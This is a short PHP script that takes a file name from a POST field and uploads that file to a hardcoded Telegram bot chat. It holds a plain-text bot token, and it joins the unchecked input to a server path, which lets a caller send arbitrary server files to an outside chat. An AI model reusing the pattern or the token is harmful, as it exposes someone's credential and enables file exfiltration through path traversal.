<?php
$arr['name'] = $_POST['pht'];

$token = '5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64';

$arrayQuery = array(
    'chat_id' => 961145889,
    'caption' => $login,
    'photo' => curl_file_create(__DIR__ . $arr['name'])
);
$ch = curl_init('https://api.telegram.org/bot'. $token .'/sendPhoto');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $arrayQuery);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
$res = curl_exec($ch);
curl_close($ch);

?>
